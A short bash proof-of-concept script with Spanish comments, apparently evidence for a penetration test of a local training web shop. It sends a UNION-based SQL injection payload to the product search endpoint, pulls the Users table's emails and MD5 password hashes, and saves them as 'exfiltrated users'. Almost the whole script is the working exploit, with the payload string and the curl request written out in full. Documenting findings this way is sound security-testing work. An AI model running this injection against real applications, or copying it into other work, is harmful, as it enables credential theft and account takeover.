#!/usr/bin/env bash
# V-02 · SQLi UNION en búsqueda -> exfiltración de Users (routes/search.ts:21). Products = 10 columnas.
set -uo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
HERE="$(cd "$(dirname "$0")" && pwd)"; EVID="${EVID:-$HERE/../../evidencias/h2-V-02-sqli-union-search}"; mkdir -p "$EVID"
Q="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9','10' FROM Users--"
echo "[$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')] V-02 SQLi UNION -> $BASE_URL"
echo "$Q" > "$EVID/payload.txt"
HTTP=$(curl -s -G "$BASE_URL/rest/products/search" --data-urlencode "q=$Q" -o "$EVID/response.json" -w '%{http_code}')
echo "HTTP $HTTP"; echo "$HTTP" > "$EVID/http_code.txt"
python3 - "$EVID/response.json" > "$EVID/usuarios-exfiltrados.txt" <<'PY'
import sys,json
d=json.load(open(sys.argv[1]));rows=d.get('data',[])
print("usuarios exfiltrados:",len(rows))
for r in rows:
    print(f"  {r.get('name')}  ->  {r.get('description')}")
PY
N=$(python3 -c "import json;print(len(json.load(open('$EVID/response.json')).get('data',[])))")
echo "PASS: $N filas de Users (email + hash MD5) devueltas por la búsqueda"
[ "$N" -gt 0 ] && echo "VULN CONFIRMADA (V-02): exfiltración de credenciales por UNION SQLi"
